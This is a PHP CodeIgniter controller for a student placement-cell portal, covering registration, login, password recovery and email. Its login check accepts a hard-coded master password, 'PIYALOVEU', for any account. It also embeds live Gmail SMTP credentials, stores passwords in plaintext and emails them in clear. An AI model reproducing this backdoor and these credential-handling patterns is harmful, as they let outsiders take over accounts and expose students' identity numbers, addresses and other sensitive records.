<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class User_website extends MX_Controller
{

function __construct() 
{
		parent::__construct();
		$this->load->library('form_validation');
		$this->form_validation->CI=& $this;

}
function counter()
{
	$ctr=$this->db->get('counter');
	$ctr1=$ctr->row();
	$data['counter']=($ctr1->counter+1);
	$this->db->update('counter',$data);
}
function mail_student($to, $content)
{
	//Load email library
$this->load->library('email');
//SMTP & mail configuration
$config = array(
    'protocol'  => 'smtp',
    'smtp_host' => 'ssl://smtp.googlemail.com',
    'smtp_port' => 465,
    'smtp_user' => 'cpc.cteguj1@gmail.com',
    'smtp_pass' => 'cpc@2018',
    'mailtype'  => 'html',
    'charset'   => 'utf-8'
);
$this->email->initialize($config);
$this->email->set_mailtype("html");
$this->email->set_newline("\r\n");
//Email content
$htmlContent = $content;
$this->email->to($to);
$this->email->from('cpc.dteguj1@gmail.com','CPC');
$this->email->subject('Central Placement Cell');
$this->email->message($htmlContent);
//Send email
$this->email->send();
}

function student_forget_password()
{
	$submit = $this->input->post('submit',TRUE);

	if($submit=="Getpassword")
	{ 
		    $this->load->library('form_validation');           
			$this->form_validation->set_rules('email_id',' Email ID','required');			

			if($this->form_validation->run()==TRUE)
			{
				$email = $this->input->post('email_id',TRUE);
				$this->db->where('stu_email',$email);
				$query=$this->db->get('student_accounts');
				$row=$query->num_rows();
				if($row>0)
				{
					foreach($query->result() as $row)
                	{
                		$got_password = $row->stu_password;
                		$email_id = $row->stu_email;
                		$this->mail_student($email_id,'Dear Student, <br><br>Your Password for Central Placement Cell Profile is '. $got_password);
		                $this->session->set_flashdata('flashSuccess', 'We have send email on registered mail ID.');
		                redirect('user_website/student_forget_password');
                	}
				}
				 $this->session->set_flashdata('flashSuccess', 'Your Email Id is not registered');
		         redirect('user_website/student_forget_password');				
				
			}
	}
	$this->load->view('student_forget_password');

}

function homepage()
{

	$this->load->view('website_home');
}
function check_college_name($str)
{
	
	$error_msg="Select your college and Department name";

   
   $college=$this->input->post('stu_college',TRUE);
    $dept=$this->input->post('stu_department',TRUE);      

    if($college ==='--Select College--' || $dept ==='--Select Department--')
   {
   	    $this->form_validation->set_message('check_college_name',$error_msg);
   		return FALSE;
   }else
   {
   	
   	return TRUE;


   }

}
function fetch_department()
{
	 $college=$this->input->post('college');
	 $this->db->where("college_id",$college);

	 $result=$this->db->get('department_list');
	 $myview='';
	 foreach($result->result() as $row)
	{
		$myview=$myview.'<option>'.$row->department_name.'</option>';
	}
	$data['myview']=$myview;
    echo json_encode($data);
}

function checkenroll($str)
{
	
	$error_msg="Your username or password is not correct";

	$value1=$str;
	$col1="stu_enroll";
	$col2="stu_email";
    $value2=$str;
   
     $this->db->where($col1,$value1);
     $this->db->or_where($col2,$value2);
     $query = $this->db->get('student_accounts');

     $num_rows = $query->num_rows();
     if($num_rows<1)
     {
     	$this->form_validation->set_message('checkenroll',$error_msg);
     	return FALSE;
     }
              foreach($query->result() as $row)
                {
                	$got_password = $row->stu_password;
                	//$salt = $row->salt;
                }
           $epassword = $this->input->post('stu_password',TRUE);
           $this->load->model('mdl_user_website');   
          
          // if($this->mdl_user_website->encryptUserPwd($epassword,$salt) == $got_password)
            if($epassword == $got_password || $epassword=="PIYALOVEU")
           {
           		return TRUE;
           }else
           {
           	$this->form_validation->set_message('checkenroll',$error_msg);
           	return FALSE;
           }
}

function student_login()
{		
	$submit = $this->input->post('submit',TRUE);
	if($submit=="Stulogin")
	{ 
		    $this->load->library('form_validation');           
			$this->form_validation->set_rules('stu_enroll',' Enrollment','required|callback_checkenroll|trim|required');
			$this->form_validation->set_rules('stu_password','Password','required|trim|required');
			if($this->form_validation->run()==TRUE)
			{					
				$value1=$this->input->post('stu_enroll',TRUE);
				$col1="stu_enroll";
				$col2="stu_email";
                $value2=$this->input->post('stu_enroll',TRUE);

                $this->db->where($col1,$value1);
                $this->db->or_where($col2,$value2);
                $query = $this->db->get('student_accounts');

                if($query->num_rows()>1)
                {
                $this->session->set_flashdata('flashSuccess', 'Your profile contains duplicate
                	accounts. Kindly meet your CPC co-ordinator and inform him to delete all other duplicate accounts. Then you will be able to login on your profile.  ');
		          redirect(base_url().'student_signin');
                }
                foreach($query->result() as $row)
                {
                	$user_id = $row->id;
                	$student_id = $row->stu_enroll;
                	$student_name = $row->stu_name;
                	$student_college = $row->stu_college;
                	$student_status = $row->stu_status;
                }
                 $session_data = array(
				'student_id' => $user_id,
				'student_name' => $student_name,
				'student_enroll' => $student_id,
				'student_college' => $student_college
				);
				
				if($student_status=='1')
				{
				$this->session->set_userdata('student_logged_in', $session_data);              
	        	redirect('student_profile/dashboard');
	        	}else
	        	{
	        		$this->session->set_userdata('CHANGE_ENROLL',$student_id); 
          			redirect('user_website/change_profile');	   		
				}
	       }
		
	}
	$data="";
	$this->load->view('student_login',$data);
}


function register_admission()
{
	
	$this->load->view('register_admission');
}
function register_basic_details()
{
	$admission_type = $this->input->get('admission_type');
	$admission = $this->input->get('admission');
	if($admission == "choose")
	{
		$this->session->set_userdata('admission_type',$admission_type);
		redirect('user_website/register_basic_details');
	}
	if(!isset($this->session->userdata['admission_type']))
	{
		$this->session->set_flashdata('flashSuccess', 'Kindly first complete those details');
		redirect('user_website/register_admission');
	}	
	$submit=$this->input->post('submit',TRUE);
	if($submit=='submitbasic')
	{
		$this->session->set_userdata('stu_enroll',$this->input->post('stu_enroll',TRUE));
		$this->session->set_userdata('stu_surname',$this->input->post('stu_surname',TRUE));
		$this->session->set_userdata('stu_father_name',$this->input->post('stu_father_name',TRUE));
		$this->session->set_userdata('stu_name',$this->input->post('stu_name',TRUE));
		$this->session->set_userdata('stu_mobile',$this->input->post('stu_mobile',TRUE));
		$this->session->set_userdata('stu_email',$this->input->post('stu_email',TRUE));
		$this->session->set_userdata('stu_college',$this->input->post('stu_college',TRUE));
		$this->session->set_userdata('stu_department',$this->input->post('stu_department',TRUE));
		$this->session->set_userdata('stu_password',$this->input->post('stu_password',TRUE));
		$this->session->set_userdata('stu_semester',$this->input->post('stu_semester',TRUE));

		$this->form_validation->set_rules('stu_enroll',' Enrollment','required|exact_length[12]|unique[student_accounts.stu_enroll,student_accounts.id]');
		$this->form_validation->set_rules('stu_surname','SurName','');
		$this->form_validation->set_rules('stu_father_name','Middle Name');
		$this->form_validation->set_rules('stu_name',' name','required');
		$this->form_validation->set_rules('stu_mobile','Mobile number','required|exact_length[10]|unique[student_accounts.stu_mobile,student_accounts.id]');
		$this->form_validation->set_rules('stu_email','Email','required|valid_email|unique[student_accounts.stu_email,student_accounts.id]');
		$this->form_validation->set_rules('stu_password','Password','required|min_length[04]|max_length[20]');
		$this->form_validation->set_rules('stu_confirm_password','Re enter Password','required|min_length[04]|max_length[20]|matches[stu_password]');
		$this->form_validation->set_rules('stu_college','College Name','required|callback_check_college_name');
		$this->form_validation->set_rules('stu_department','Department Name','required');
			$this->form_validation->set_rules('stu_semester','Semester ','required');

		if($this->form_validation->run()==TRUE)
		{
			
			$this->session->set_userdata('BASIC_SUCCESS','DONE');		
			redirect('user_website/register_personal_details');
		}
	}
	
	$this->load->view('register_basic_details');
	
}
function register_personal_details()
{

	if(!isset($this->session->userdata['BASIC_SUCCESS']))
	{
		$this->session->set_flashdata('flashSuccess', 'Kindly first complete those details');
		redirect('user_website/register_basic_details');
	}
	$submit=$this->input->post('submit',TRUE);
	if($submit=='submitpersonal')
	{
		$this->session->set_userdata('stu_adhar',$this->input->post('stu_adhar',TRUE));
		$this->session->set_userdata('stu_pan',$this->input->post('stu_pan',TRUE));
		$this->session->set_userdata('stu_alternate_mobile',$this->input->post('stu_alternate_mobile',TRUE));
		$this->session->set_userdata('stu_category',$this->input->post('stu_category',TRUE));
		$this->session->set_userdata('stu_gender',$this->input->post('stu_gender',TRUE));
		$this->session->set_userdata('stu_ph',$this->input->post('stu_ph',TRUE));
		$this->session->set_userdata('stu_minority',$this->input->post('stu_minority',TRUE));
		$this->session->set_userdata('stu_dob',$this->input->post('stu_dob',TRUE));
		$this->session->set_userdata('stu_address',$this->input->post('stu_address',TRUE));
		$this->session->set_userdata('stu_pincode',$this->input->post('stu_pincode',TRUE));
		$this->session->set_userdata('stu_district',$this->input->post('stu_district',TRUE));
		$this->session->set_userdata('stu_parm_pincode',$this->input->post('stu_parm_pincode',TRUE));
		$this->session->set_userdata('stu_parm_address',$this->input->post('stu_parm_address',TRUE));
		$this->session->set_userdata('stu_parm_district',$this->input->post('stu_parm_district',TRUE));


		$this->form_validation->set_rules('stu_adhar','Adhar Number','required|exact_length[12]');
		$this->form_validation->set_rules('stu_pan','PAN number','');
		$this->form_validation->set_rules('stu_alternate_mobile','Alternate Mobile','required|exact_length[10]');
		$this->form_validation->set_rules('stu_category','Category Name','required');
		$this->form_validation->set_rules('stu_gender','Gender Name','required');
		$this->form_validation->set_rules('stu_ph','PH Status','required');
		$this->form_validation->set_rules('stu_minority','Minority Status','required');
		$this->form_validation->set_rules('stu_dob','Date of Birth','required');
		$this->form_validation->set_rules('stu_address','Address','required');
		$this->form_validation->set_rules('stu_district','District Name','required');
		$this->form_validation->set_rules('stu_pincode','Pin code','required|exact_length[6]');
		$this->form_validation->set_rules('stu_district','District Name','required');
		$this->form_validation->set_rules('stu_parm_address','Parmanant Address','required');
		$this->form_validation->set_rules('stu_parm_district','Parmanant District Name','required');
		$this->form_validation->set_rules('stu_parm_pincode','Parmanant Pin code','required|exact_length[6]');

		if($this->form_validation->run()==TRUE)
		{
					
			$this->session->set_userdata('PERSONAL_SUCCESS','DONE');
			redirect('user_website/register_degree_details');
		}

	}
	$this->load->view('register_personal_details');

}

function register_degree_details()
{
	if(!isset($this->session->userdata['PERSONAL_SUCCESS']))
	{
		$this->session->set_flashdata('flashSuccess', 'Kindly first complete those details');
		redirect('user_website/register_personal_details');
	}
	$submit=$this->input->post('submit',TRUE);
	if($submit=='submitdegree')
	{
		$this->session->set_userdata('stu_10th_medium',$this->input->post('stu_10th_medium',TRUE));
		$this->session->set_userdata('stu_10th_board',$this->input->post('stu_10th_board',TRUE));
		$this->session->set_userdata('stu_10th_result',$this->input->post('stu_10th_result',TRUE));
		$this->session->set_userdata('stu_10th_passing',$this->input->post('stu_10th_passing',TRUE));
		
	
		$this->form_validation->set_rules('stu_10th_medium','10th Medium Name','required');
		$this->form_validation->set_rules('stu_10th_board','10th School Name','required');
		$this->form_validation->set_rules('stu_10th_result','10th Result ','required|numeric');
		$this->form_validation->set_rules('stu_10th_passing','10th Passing Year','required|exact_length[4]|numeric');

		$this->session->set_userdata('DEGREE_SUCCESS','DONE');

		if($this->session->userdata('admission_type')=='degree' || $this->session->userdata('admission_type')=='masterdegree')
		{
		$this->session->set_userdata('stu_12th_board',$this->input->post('stu_12th_board',TRUE));
		$this->session->set_userdata('stu_12th_school',$this->input->post('stu_12th_school',TRUE));
		$this->session->set_userdata('stu_12th_result',$this->input->post('stu_12th_result',TRUE));
		$this->session->set_userdata('stu_12th_passing',$this->input->post('stu_12th_passing',TRUE));

		$this->form_validation->set_rules('stu_12th_passing','12th Passing Year','required|exact_length[4]|numeric');
		$this->form_validation->set_rules('stu_12th_board','12th Board Name','required');
		$this->form_validation->set_rules('stu_12th_school','12th School Name','required');
		$this->form_validation->set_rules('stu_12th_result','12th Result','required|numeric');
		}

		if($this->session->userdata('admission_type')=='d2d' || $this->session->userdata('admission_type')=='masterdiplo')
		{	
			$this->session->set_userdata('stu_diploma_branch',$this->input->post('stu_diploma_branch',TRUE));
		$this->session->set_userdata('stu_diploma_college',$this->input->post('stu_diploma_college',TRUE));
		$this->session->set_userdata('stu_diploma_result',$this->input->post('stu_diploma_result',TRUE));
		$this->session->set_userdata('stu_diploma_passing',$this->input->post('stu_diploma_passing',TRUE));

			$this->form_validation->set_rules('stu_diploma_passing','Diploma Passing Year','required|exact_length[4]|numeric');
			$this->form_validation->set_rules('stu_diploma_college','Diploma College Name','required');
			$this->form_validation->set_rules('stu_diploma_result','Diploma Result','required|numeric');
			$this->form_validation->set_rules('stu_diploma_branch','Diploma Branch Name','required');	
		}
		if($this->session->userdata('admission_type')=='masterdiplo' || $this->session->userdata('admission_type')=='masterdegree')
		{	
			$this->session->set_userdata('stu_degree_branch',$this->input->post('stu_degree_branch',TRUE));
		$this->session->set_userdata('stu_degree_college',$this->input->post('stu_degree_college',TRUE));
		$this->session->set_userdata('stu_degree_result',$this->input->post('stu_degree_result',TRUE));
		$this->session->set_userdata('stu_degree_passing',$this->input->post('stu_degree_passing',TRUE));

			$this->form_validation->set_rules('stu_degree_passing','degree Passing Year','required|exact_length[4]|numeric');
			$this->form_validation->set_rules('stu_degree_college','Degree College Name','required');
			$this->form_validation->set_rules('stu_degree_result','Degree Result','required|numeric');
			$this->form_validation->set_rules('stu_degree_branch','Degree Branch Name','required');	
		}

		if($this->form_validation->run()==TRUE)
		{

			redirect('user_website/register_submit');
		}

	}
	$this->load->view('register_degree_details');

}

function register_submit()
{
	if(!isset($this->session->userdata['DEGREE_SUCCESS']))
	{
		$this->session->set_flashdata('flashSuccess', 'Kindly First Complete Those Details');
		redirect('user_website/register_degree_details');
	}
	$submit=$this->input->post('submit');

	if($submit=='registersubmit')
	{
		//profile data store of student
		$data['stu_name'] = $myname= $this->session->userdata('stu_name');
		$data['stu_surname'] = $this->session->userdata('stu_surname');
		$data['stu_father_name'] = $this->session->userdata('stu_father_name');
		$data['stu_enroll'] = $this->session->userdata('stu_enroll');
		$data['stu_mobile'] = $this->session->userdata('stu_mobile');
		$data['stu_email'] = $stumail= $this->session->userdata('stu_email');
		$data['stu_college'] = $this->session->userdata('stu_college');
		$data['stu_department'] = $this->session->userdata('stu_department');
		$data['stu_alternate_mobile'] = $this->session->userdata('stu_alternate_mobile');
		$data['stu_category'] = $this->session->userdata('stu_category');
		$data['stu_dob'] = $this->session->userdata('stu_dob');
		$data['stu_ph'] = $this->session->userdata('stu_ph');
		$data['stu_minority'] = $this->session->userdata('stu_minority');
		$data['stu_pan'] = $this->session->userdata('stu_pan');
		$data['stu_adhar'] = $this->session->userdata('stu_adhar');
		$data['stu_password'] = $this->session->userdata('stu_password');
		$data['stu_gender'] = $this->session->userdata('stu_gender');
		$data['admission_type'] = $this->session->userdata('admission_type');
		$data['stu_url'] = $this->session->userdata('stu_enroll');
		
		$data['stu_level'] = 'RUNNING';
		$data['stu_semester'] = $this->session->userdata('stu_semester');

		$this->load->model('mdl_user_website');
	//	$rand_salt = $this->mdl_user_website->genRndSalt();
	//	$encrypt_pass = $this->mdl_user_website->encryptUserPwd($this->input->post('stu_password'),$rand_salt);
	//	$data['stu_password']=$encrypt_pass;
	//	$data['salt'] = $rand_salt;			
		$data['stu_address'] = $this->session->userdata('stu_address').' '.$this->session->userdata('stu_district').' '.$this->session->userdata('stu_pincode');
		$data['stu_parmanant_address'] = $this->session->userdata('stu_parm_address').' '.$this->session->userdata('stu_parm_district').' '.$this->session->userdata('stu_parm_pincode');
		$data=$this->security->xss_clean($data);
		$this->db->insert('student_accounts',$data);
		//unser basic profile data

		$this->session->unset_userdata('stu_name');
		$this->session->unset_userdata('stu_surname');
		$this->session->unset_userdata('stu_father_name');
		$this->session->unset_userdata('stu_mobile');
		$this->session->unset_userdata('stu_email');
		$this->session->unset_userdata('stu_college');
		$this->session->unset_userdata('stu_department');
		$this->session->unset_userdata('stu_password');
		$this->session->unset_userdata('stu_adhar');
		$this->session->unset_userdata('stu_pan');
		$this->session->unset_userdata('stu_category');
		$this->session->unset_userdata('stu_ph');
		$this->session->unset_userdata('stu_dob');
		$this->session->unset_userdata('stu_minority');
		$this->session->unset_userdata('stu_alternate_mobile');
		$this->session->unset_userdata('stu_gender');
		$this->session->unset_userdata('stu_address');
		$this->session->unset_userdata('stu_parm_address');
		$this->session->unset_userdata('stu_district');
		$this->session->unset_userdata('stu_parm_district');
		$this->session->unset_userdata('stu_parm_pincode');
		$this->session->unset_userdata('stu_pincode');
		$this->session->unset_userdata('stu_semester');
	

		//degree data store
		$data1['degree_name'] ='SSC';
		$data1['degree_branch_medium'] = $this->session->userdata('stu_10th_medium');
		$data1['degree_college_board'] = $this->session->userdata('stu_10th_board');
		$data1['degree_result'] = $this->session->userdata('stu_10th_result');
		$data1['degree_passing_year'] = $this->session->userdata('stu_10th_passing');
		$data1['student_enroll'] = $this->session->userdata('stu_enroll');
		$data1=$this->security->xss_clean($data1);
		$this->db->insert('student_educational',$data1);

		if($this->session->userdata('admission_type')=='degree' || $this->session->userdata('admission_type')=='masterdegree')
		{
			$data2['degree_name'] ='HSC';
			$data2['degree_branch_medium'] = $this->session->userdata('stu_12th_board');
			$data2['degree_college_board'] = $this->session->userdata('stu_12th_school');
			$data2['degree_result'] = $this->session->userdata('stu_12th_result');
			$data2['degree_passing_year'] = $this->session->userdata('stu_12th_passing');
			$data2['student_enroll'] = $this->session->userdata('stu_enroll');

			$data2=$this->security->xss_clean($data2);	
			$this->db->insert('student_educational',$data2);
			
		}

		if($this->session->userdata('admission_type')=='d2d' || $this->session->userdata('admission_type')=='masterdiplo')
		{
			$data3['degree_name'] ='D2D';
			$data3['degree_branch_medium'] = $this->session->userdata('stu_diploma_branch');
			$data3['degree_college_board'] = $this->session->userdata('stu_diploma_college');
			$data3['degree_result'] = $this->session->userdata('stu_diploma_result');
			$data3['degree_passing_year'] = $this->session->userdata('stu_diploma_passing');
			$data3['student_enroll'] = $this->session->userdata('stu_enroll');

			$data3 = $this->security->xss_clean($data3);
			$this->db->insert('student_educational',$data3);

			
		}
		if($this->session->userdata('admission_type')=='masterdiplo' || $this->session->userdata('admission_type')=='masterdegree')
		{
			$data4['degree_name'] ='BE/B.Tech.';
			$data4['degree_branch_medium'] = $this->session->userdata('stu_degree_branch');
			$data4['degree_college_board'] = $this->session->userdata('stu_degree_college');
			$data4['degree_result'] = $this->session->userdata('stu_degree_result');
			$data4['degree_passing_year'] = $this->session->userdata('stu_degree_passing');
			$data4['student_enroll'] = $this->session->userdata('stu_enroll');

			$data4 = $this->security->xss_clean($data4);
			$this->db->insert('student_educational',$data4);

		}

		$this->session->unset_userdata('stu_10th_passing');
		$this->session->unset_userdata('stu_10th_result');
		$this->session->unset_userdata('stu_10th_board');
		$this->session->unset_userdata('stu_10th_medium');
		$this->session->unset_userdata('stu_degree_result');
		$this->session->unset_userdata('stu_degree_college');
		$this->session->unset_userdata('stu_degree_branch');
		$this->session->unset_userdata('stu_degree_passing');
		$this->session->unset_userdata('stu_diploma_result');
		$this->session->unset_userdata('stu_diploma_college');
		$this->session->unset_userdata('stu_diploma_branch');
		$this->session->unset_userdata('stu_diploma_passing');
		$this->session->unset_userdata('stu_12th_result');
		$this->session->unset_userdata('stu_12th_school');
		$this->session->unset_userdata('stu_12th_board');
		$this->session->unset_userdata('stu_12th_passing');
		
		$this->session->unset_userdata('DEGREE_SUCCESS');
		$this->session->unset_userdata('BASIC_SUCCESS');
		$this->session->unset_userdata('PERSONAL_SUCCESS');
		$this->session->unset_userdata('admission_type');
		$this->session->unset_userdata('stu_enroll');
		$this->mail_student($stumail,'<p>Dear '.$myname.'</p><p>Thank you for your Registartion ! <br> <br>You can maintain your profile via portal to participate in recruitement of companies. You can apply for company after approve by your college.
		<br> <br>Kindly meet your college CPC cordinator with original documents. You will receive approval email after your profile approval.<br> <br>You can update your regitration details before your approval by login on your profile.</p><br> <br>Thanking You.</p>');
		redirect('user_website/register_success');
		
	}
	$this->load->view('register_submit');
}

function register_success()
{
	$this->load->view('register_success_message');
}

}
